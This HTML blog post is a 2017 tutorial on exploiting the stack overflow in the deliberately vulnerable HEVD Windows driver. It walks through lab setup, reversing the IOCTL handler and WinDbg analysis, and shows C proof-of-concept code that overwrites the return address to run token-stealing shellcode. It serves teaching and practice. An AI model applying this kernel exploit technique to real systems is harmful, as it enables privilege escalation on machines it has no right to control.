<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="First exploit in Windows Kernel (HEVD)" prefix="og: http://ogp.me/ns#" property=og:title><meta content="First exploit in Windows Kernel (HEVD) - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2017-08-18-first-exploit-in-windows-kernel-hevd property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/win-kernel-debug/win8-setup-kernel-mode.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="First exploit in Windows Kernel (HEVD) - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2017-08-18-first-exploit-in-windows-kernel-hevd name=twitter:url><meta content=https://blahcat.github.io/img/win-kernel-debug/win8-setup-kernel-mode.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2017-08-18-first-exploit-in-windows-kernel-hevd",
      
      "image": https://blahcat.github.io/img/win-kernel-debug/win8-setup-kernel-mode.png",
      
      
      "description": First exploit in Windows Kernel (HEVD) - by hugsy",
      
    }
    </script><title>
  First exploit in Windows Kernel (HEVD)
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/win-kernel-debug/win8-setup-kernel-mode.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>First exploit in Windows Kernel (HEVD)</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 18 August 2017 <br> <br> <i>Reading time: 9 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>Hi there ✋<p>This post is the third chapter of this series, where we dive into Windows kernel. The previous posts introduced respectively how to painlessly setup a Windows exploit lab, then how to create a custom shellcode for the kernel to execute.<p>So now we need vulnerabilities to get control of the program counter (RIP since we only focus on x64). For that, we’ll use the most awesome <strong>Extremely Vulnerable Driver</strong>.<h1 id=setup>Setup</h1><p><a rel="noopener nofollow noreferrer" href=https://github.com/hacksysteam/HackSysExtremeVulnerableDriver target=_blank>HackSys Extremely Vulnerable Driver</a> is a Windows driver for x86 and x64 created by the HackSys Team (huge props!). Once injected into Windows, this driver purposely offers several types of vulnerabilities, to help us practice on them and/or assist us developing new exploitation techniques.<h2 id=on-the-windows-8-1-x64-debuggee-vm>On the Windows 8.1 x64 debuggee VM</h2><p>Download and unzip in the Windows 8.1 x64 debuggee VM:<ul><li><a href="https://www.osronline.com/article.cfm?article=157" rel="noopener nofollow noreferrer" target=_blank>OSR Driver Loader</a><li><a rel="noopener nofollow noreferrer" href=https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases/download/v1.20/HEVD.1.20.zip target=_blank>HackSys Extremely Vulnerable Driver</a></ul><p>Then simply run the <code>OSR Driver Loader</code> and register the AMD64 version of <code>HEVD.sys</code>.</p><a href=/img/win-kernel-debug/register-hevd.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/register-hevd.png title=image_alt width=100%> </a><p>You can then start the service.<p>But what about the kernel driver signing policy you may ask from Windows Vista and up? Good point: well in Debug mode, unless <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows-hardware/drivers/install/installing-an-unsigned-driver-during-development-and-test#a-href-idenforcing-kernel-mode-signature-verification-in-kernel-debugging-modea-enforcing-kernel-mode-signature-verification-in-kernel-debugging-mode target=_blank>explicitly stated otherwise via the registry</a> the MSDN states that<blockquote><p>Attaching an active kernel debugger to a development or test computer disables load-time signature enforcement for kernel-mode drivers.</blockquote><p>So we’re good here, let’s proceed…<h2 id=on-the-windows-debugger-vm>On the Windows debugger VM</h2><p>The AMD64 directory of HEVD contains the PDB symbols that WinDbg will use for extra information, so copy this PDB into a <code>hevd.pdb</code> directory located within one of the path defined in the <code>_NT_SYMBOL_PATH</code> environment variable. For example like this (you might need to adjust to your own configuration):<pre class=language-bat data-lang=bat style=color:#c0c5ce;background-color:#2b303b><code class=language-bat data-lang=bat><span>C:>  </span><span style=color:#b48ead>set </span><span>| </span><span style=color:#b48ead>find </span><span>"</span><span style=color:#a3be8c>_NT_SYMBOL_PATH</span><span>"
</span><span>_NT_SYMBOL_PATH=SRV*C:\symbols*http://msdl.microsoft.com/download/symbols;
</span><span>C:> </span><span style=color:#b48ead>mkdir</span><span> C:\symbols\hevd.pdb
</span><span>C:> </span><span style=color:#b48ead>mkdir</span><span> C:\syms\hevd.pdb\8F6551A1E31E4F65B536C8DCB40F999B1
</span><span>C:> </span><span style=color:#b48ead>xcopy </span><span>%</span><span style=color:#bf616a>HOMEPATH</span><span>%\Desktop\AMD64\*.pdb C:\symbols\hevd.pdb\8F6551A1E31E4F65B536C8DCB40F999B1
</span></code></pre><p>We can use WinDbg to check that:<ul><li>the HEVD driver is properly loaded:</ul><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> lm m HEVD
</span><span>start             end                 module name
</span><span>fffff800`c1e39000 fffff800`c1e42000   HEVD       (deferred)
</span></code></pre><ul><li>WinDbg can retrieve its symbols:</ul><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> .sympath
</span><span>Symbol search path is: srv*c:\symbols*http://msdl.microsoft.com/download/symbols
</span><span>
</span><span>kd> x HEVD!*
</span><span>fffff800`c1e3c110 HEVD!g_UseAfterFreeObject = 0x00000000`00000000
</span><span>fffff800`c1e3c108 HEVD!__security_cookie_complement = 0xffff07ff`3e1c34a0
</span><span>fffff800`c1e3b368 HEVD!$xdatasym = 0x01 ''
</span><span>fffff800`c1e3b388 HEVD!$xdatasym = 0x01 ''
</span><span>fffff800`c1e3c000 HEVD!HotPatchBuffer = struct _PATCH_BUFFER
</span><span>[...]
</span></code></pre><p>Last, you may overwrite the <code>nt!Kd_Default_Mask</code> to increase/decrease Windows kernel verbosity from WinDbg<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> ed nt!Kd_Default_Mask 0xf
</span></code></pre><p>However, my preferred approach is to edit the registry on the debuggee to always print debug info. This can be done via the key <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter</code> in an Admin command prompt:<pre class=language-bat data-lang=bat style=color:#c0c5ce;background-color:#2b303b><code class=language-bat data-lang=bat><span>C:> </span><span style=color:#b48ead>reg</span><span> add "</span><span style=color:#a3be8c>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter</span><span>" /v DEFAULT /t REG_DWORD /d </span><span style=color:#d08770>0xf
</span></code></pre><p><strong>Quick tip</strong>: use <code>kd</code> command <code>!dbgprint</code> to navigate through the DbgPrint buffer.<p>We’re ready dive in!<h1 id=reverse-engineering-hevd-sys>Reverse-Engineering HEVD.sys</h1><p>Although the <a rel="noopener nofollow noreferrer" href=https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver target=_blank>source code</a> of the entire driver is freely accessible, going black-box reversing (i.e. without any source code) is a good practice for real-life bug hunting. Moreover, the driver is well written, no obfuscation/packing in place, and the symbols are provided, to greatly improve the reversing process.<h2 id=hunting-the-vulnerability>Hunting the vulnerability</h2><h3 id=talking-to-the-hevd-driver>Talking to the HEVD driver</h3><p>Any Windows driver must define an entry point by which Windows can load it. This is done with the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff544113(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank>DriverEntry</a> routine whose signature is as follow:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>NTSTATUS </span><span style=color:#8fa1b3>DriverEntry</span><span>(
</span><span>  _In_ </span><span style=color:#b48ead>struct</span><span> _DRIVER_OBJECT *</span><span style=color:#bf616a>DriverObject</span><span>,
</span><span>  _In_ PUNICODE_STRING       RegistryPath
</span><span>)
</span></code></pre><p>WinDbg confirms that immediately:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> x HEVD!DriverEntry
</span><span>fffff800`c1e41008 HEVD!DriverEntry (struct _DRIVER_OBJECT *, struct _UNICODE_STRING *)
</span></code></pre><p>By checking this function in IDA Pro, we spot immediately that the driver creates a device called <code>\Device\HackSysExtremeVulnerableDriver</code> via the routine <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff548397(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank><code>IoCreateDevice</code></a>, with a <code>DeviceType</code> set as <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types target=_blank><code>FILE_DEVICE_UNKNOWN</code></a> - or 0x22.</p><a href=/img/win-kernel-debug/hevd-stack-overflow-ida-driver-entry.png target=_blank> <img alt="DriverEntry in IDA" title="DriverEntry in IDA" src=/img/win-kernel-debug/hevd-stack-overflow-ida-driver-entry.png width=100%> </a><p>Then the <code>DriverObject</code> gets populated with the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff544174(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank>structure members</a> including functions pointers, among which we find the IOCTL handler, <code>IrpDeviceIoCtlHandler</code>. This function dispatches <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Ioctl target=_blank>IOCTL</a> requests done from user-land to the HEVD driver. Every IOCTL is uniquely identified by a specific code, and the handler will basically do a big <code>switch(dwIoControlCode){...}</code> to execute the corresponding code. IDA is capable of pulling out for us:</p><a href=/img/win-kernel-debug/hevd-stack-overflow-ida-ioctl-1.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/hevd-stack-overflow-ida-ioctl-1.png title=image_alt width=100%> </a><p>In this first exploitation, we want to reach the <code>StackOverflowIoctlHandler</code>, and therefore need to send a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank><code>DeviceIoControl()</code></a> request with a code set to 0x222003.<p><strong>Note</strong>: for this initial post, we’ll focus on the stack overflow vulnerability, but future posts may cover the other vulnerabilities in the HEVD driver, for which we’ll only need to change the <code>dwIoControlCode</code> value in order to reach them.<p>So we know how to reach the driver and the targeted function, which would look like (in pseudo-C):<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>
</span><span style=color:#b48ead>#define </span><span>IOCTL_HEVD_STACK_OVERFLOW </span><span style=color:#d08770>0x222003
</span><span>
</span><span>
</span><span>HANDLE hDevice = </span><span style=color:#bf616a>CreateFileA</span><span>("</span><span style=color:#96b5b4>\\\\</span><span style=color:#a3be8c>.</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>HackSysExtremeVulnerableDriver</span><span>", ...);
</span><span>BOOL bResult = </span><span style=color:#bf616a>DeviceIoControl</span><span>(hDevice, IOCTL_HEVD_STACK_OVERFLOW,
</span><span>                               lpBufferIn, dwBufferInLength, ...);
</span></code></pre><h3 id=analyzing-the-vulnerability>Analyzing the vulnerability</h3><p>We know how to reach <code>StackOverflowIoctlHandler()</code> from user-land, and pass in an controlled buffer of an arbitrary size. Here is the <code>TriggerStackOverflow</code> function translated to pseudo-C:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>int </span><span style=color:#8fa1b3>TriggerStackOverflow</span><span>(</span><span style=color:#b48ead>void </span><span>*</span><span style=color:#bf616a>UserBuffer</span><span>, uint64_t </span><span style=color:#bf616a>Size</span><span>)
</span><span>{
</span><span>  </span><span style=color:#b48ead>char</span><span> Dst[</span><span style=color:#d08770>2048</span><span>];
</span><span>  </span><span style=color:#bf616a>ZeroMemory</span><span>(Dst, </span><span style=color:#d08770>0x800</span><span>);
</span><span>  </span><span style=color:#bf616a>ProbeForRead</span><span>(UserBuffer, </span><span style=color:#d08770>0x800</span><span>, </span><span style=color:#d08770>4</span><span>);
</span><span>  </span><span style=color:#bf616a>DbgPrint_0</span><span>("</span><span style=color:#a3be8c>[+] UserBuffer: 0x</span><span style=color:#d08770>%p</span><span style=color:#96b5b4>\n</span><span>", UserBuffer);
</span><span>  </span><span style=color:#bf616a>DbgPrint_0</span><span>("</span><span style=color:#a3be8c>[+] UserBuffer Size: 0x</span><span style=color:#d08770>%X</span><span style=color:#96b5b4>\n</span><span>", Size);
</span><span>  </span><span style=color:#bf616a>DbgPrint_0</span><span>("</span><span style=color:#a3be8c>[+] KernelBuffer: 0x</span><span style=color:#d08770>%p</span><span style=color:#96b5b4>\n</span><span>", &Dst);
</span><span>  </span><span style=color:#bf616a>DbgPrint_0</span><span>("</span><span style=color:#a3be8c>[+] KernelBuffer Size: 0x</span><span style=color:#d08770>%X</span><span style=color:#96b5b4>\n</span><span>", </span><span style=color:#d08770>0x800</span><span>);
</span><span>  </span><span style=color:#bf616a>DbgPrint_0</span><span>("</span><span style=color:#a3be8c>[+] Triggering Stack Overflow</span><span style=color:#96b5b4>\n</span><span>");
</span><span>  </span><span style=color:#bf616a>RtlCopyMemory</span><span>(Dst, UserBuffer, Size);
</span><span>  </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
</span><span>}
</span></code></pre><p>The code leaves no room for ambiguity about the vulnerability: we can overflow the kernel stack by passing in a buffer of length > 0x800 bytes. Since the buffer is read directly from user-land (<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff559876(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank><code>ProbeForRead</code></a>) we have full control over it, which simplifies greatly the exploitation.<p>So the exploit code looks clearer:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>
</span><span style=color:#b48ead>#define </span><span>IOCTL_HEVD_STACK_OVERFLOW </span><span style=color:#d08770>0x222003
</span><span>
</span><span>
</span><span>HANDLE hDevice = </span><span style=color:#bf616a>CreateFileA</span><span>("</span><span style=color:#96b5b4>\\\\</span><span style=color:#a3be8c>.</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>HackSysExtremeVulnerableDriver</span><span>", ...);
</span><span>
</span><span>LPVOID lpInBuffer = </span><span style=color:#bf616a>VirtualAlloc</span><span>(</span><span style=color:#d08770>NULL</span><span>, </span><span style=color:#d08770>0x1000</span><span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span><span>DWORD nInBufferSize = </span><span style=color:#d08770>0x800 </span><span>+ </span><span style=color:#d08770>0x50</span><span>;
</span><span style=color:#bf616a>ZeroMemory</span><span>(lpInBuffer, </span><span style=color:#d08770>0x1000</span><span>);
</span><span style=color:#bf616a>RtlFillMemory</span><span>(lpInBuffer, </span><span style=color:#d08770>0x1000</span><span>, '</span><span style=color:#a3be8c>A</span><span>'); </span><span style=color:#65737e>// for now, let's just populate the stack with 'A'
</span><span>
</span><span>
</span><span>BOOL bResult = </span><span style=color:#bf616a>DeviceIoControl</span><span>(hDevice, IOCTL_HEVD_STACK_OVERFLOW,
</span><span>                               lpBufferIn, dwBufferInLength, ...);
</span></code></pre><p>And move on to the dynamic analysis…<h1 id=dynamic-analysis>Dynamic analysis</h1><p>Assuming <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention target=_blank>SMEP</a> is not enabled, once we control the program counter, we can simply return to an known executable location in user-land, location that’ll hold <a href=/2017/08/14/a-primer-to-windows-x64-shellcoding>the shellcode we created in the last post</a>. But to know the state of the stack after the overflow but before exiting the function, it’d be nice to have WinDbg break at the <code>ret</code> instruction of <code>TriggerStackOverflow</code>. Since ASLR is enabled, we can’t just break at a fixed address and having to compute the address would be tedious, but fortunately, WinDbg, in its all awesomeness, provides the command “Break Unresolved” (<code>bu</code>) which provides a clean way to circumvent this issue:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> uf HEVD!TriggerStackOverflow
</span><span>[...]
</span><span>  101 fffff801`8063e707 5f              pop     rdi
</span><span>  101 fffff801`8063e708 c3              ret
</span><span>
</span><span>kd> ? fffff801`8063e708 - HEVD!TriggerStackOverflow
</span><span>Evaluate expression: 200 = 00000000`000000c8
</span><span>
</span><span>kd> bu HEVD!TriggerStackOverflow+c8
</span></code></pre><p>We can now compile and run our first PoC, and wait for WinDbg to catch the breakpoint.</p><a href=/img/win-kernel-debug/hevd-stack-overflow-windbg-ret.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/hevd-stack-overflow-windbg-ret.png title=image_alt width=100%> </a><p>If we check the stack, we see that we’ve successfully overwritten the return address:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>          |                |
</span><span>          |    ReturnAddr  |
</span><span>          |       SFP      |
</span><span>          | AAAAAAAAAAAAAA |
</span><span>          | AAAAAAAAAAAAAA |
</span><span>          | AAAAAAAAAAAAAA |
</span><span>          | AAAAAAAAAAAAAA |
</span><span>          | AAAAAAAAAAAAAA |
</span><span>          | AAAAAAAAAAAAAA |
</span><span>          |                |
</span></code></pre><p>So we know that our user-land allocated must be something like:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>                     0x800 bytes             8 bytes    8 bytes
</span><span> _____________________^___________________   ___^____   ___^____
</span><span>/                                         \ /        \ /        \
</span><span>|                                          |          |          |
</span><span>| Shellcode + Padding                      | BBBBBBBB | addr. of |
</span><span>|                                          |          |  buffer  |
</span><span>^                                                          |
</span><span>|                                                          |
</span><span>\__________________________________________________________/
</span></code></pre><p>Which translates into the following C code:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>#define </span><span>IOCTL_HEVD_STACK_OVERFLOW </span><span style=color:#d08770>0x222003
</span><span>
</span><span>
</span><span style=color:#65737e>/* 1. Get a handle to the driver */
</span><span>HANDLE hDevice = </span><span style=color:#bf616a>CreateFileA</span><span>("</span><span style=color:#96b5b4>\\\\</span><span style=color:#a3be8c>.</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>HackSysExtremeVulnerableDriver</span><span>", ...);
</span><span>
</span><span style=color:#65737e>/* 2. Populate our controlled area */
</span><span>LPVOID lpInBuffer = </span><span style=color:#bf616a>VirtualAlloc</span><span>(</span><span style=color:#d08770>NULL</span><span>, </span><span style=color:#d08770>0x1000</span><span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span><span>DWORD nInBufferSize = </span><span style=color:#d08770>0x800 </span><span>+ </span><span style=color:#d08770>0x50</span><span>;
</span><span style=color:#bf616a>ZeroMemory</span><span>(lpInBuffer, </span><span style=color:#d08770>0x1000</span><span>);
</span><span style=color:#bf616a>CopyMemory</span><span>(lpInBuffer, StealTokenShellcode, StealTokenShellcodeLength);
</span><span style=color:#bf616a>RtlFillMemory</span><span>(lpInBuffer+StealTokenShellcodeLength, </span><span style=color:#d08770>0x1000</span><span>-StealTokenShellcodeLength, '</span><span style=color:#96b5b4>\xcc</span><span>');
</span><span>uint64_t *ptr = (uint64_t*) (lpInBuffer + </span><span style=color:#d08770>0x808</span><span>);
</span><span>*ptr = (uint64_t)lpInBuffer;
</span><span>
</span><span style=color:#65737e>/* 3. Send the IOCTL request */
</span><span>BOOL bResult = </span><span style=color:#bf616a>DeviceIoControl</span><span>(hDevice, IOCTL_HEVD_STACK_OVERFLOW,
</span><span>                               lpBufferIn, dwBufferInLength, ...);
</span><span>
</span><span style=color:#65737e>/* 4. Profit */
</span></code></pre><h1 id=final-wrap-up>Final wrap-up</h1><p>The final exploit can be found <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/hevd/blob/feb6d67ca5f5f3c0718042b42e22adbeee6aee62/StackOverflow/exploit.c target=_blank>here</a>. It includes a few extra logging information and nice cleanup so the executable can be reused many times.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> x86_64-w64-mingw32-gcc</span><span style=color:#bf616a> -D__WIN81__ -D__X86_64__ -o</span><span> exploit.exe exploit.c
</span></code></pre><p>The PE <code>exploit.exe</code> provided was compiled with the exploitation offsets of the internal structures of Windows 8.1 x86. Reusing directly the PE on another version of Windows might produce an unexpected behavior.<p>We can run it, and w00t !</p><a href=/img/win-kernel-debug/hevd-stack-overflow-exploit.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/hevd-stack-overflow-exploit.png title=image_alt width=100%> </a><p>I’ve also added to the repository my WinDbg workspaces (for both user-mode and kernel-mode) along with a header file <code>hevd.h</code> with a few functions helping the exploit process of this awesome vulnerable driver.<p>Until next time, ✌<h1 id=related-links>Related links</h1><ul><li><a rel="noopener nofollow noreferrer" href=http://windbg.info/doc/1-common-cmds.html target=_blank>WinDbg cheatsheet</a><li><a href="https://msdn.microsoft.com/en-us/ie/ff563197(v=vs.94)" rel="noopener nofollow noreferrer" target=_blank>.hh command</a><li><a href="http://j00ru.vexillium.org/?p=783&lang=en" rel="noopener nofollow noreferrer" target=_blank>SMEP: What is it, and how to beat it on Windows</a></ul><aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/tutorial/>#tutorial</a> <a href=https://blahcat.github.io/categories/research/>#research</a><p>Tags: <a href=https://blahcat.github.io/tags/windows/>#windows</a> <a href=https://blahcat.github.io/tags/kernel/>#kernel</a> <a href=https://blahcat.github.io/tags/debugging/>#debugging</a> <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/stack-overflow/>#stack-overflow</a> <a href=https://blahcat.github.io/tags/hevd/>#hevd</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=First exploit in Windows Kernel (HEVD)" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2017-08-31-arbitrary-write-primitive-in-windows-kernel-hevd/> <section class=post-nav-teaser><b class=post-nav-title>Arbitrary Write primitive in Windows kernel (HEVD)</b><p class=post-nav-excerpt>Back again to modern Windows kernel exploitation! After understanding how t…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2017-08-14-a-primer-to-windows-x64-shellcoding/> <section class=post-nav-teaser><b class=post-nav-title>A Primer to Windows x64 shellcoding</b><p class=post-nav-excerpt>Continuing on the path to Windows kernel exploitation… Thanks to the previo…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>